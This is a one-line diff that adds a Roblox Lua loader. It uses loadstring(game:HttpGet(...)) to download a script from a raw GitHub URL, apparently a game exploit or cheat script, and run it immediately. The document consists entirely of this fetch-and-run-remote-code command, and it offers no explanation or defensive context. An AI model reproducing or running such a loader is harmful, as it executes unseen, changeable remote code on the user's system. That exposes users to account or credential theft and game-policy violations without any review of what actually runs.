@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/gag-officialscripts/execute/refs/heads/main/updated"))()
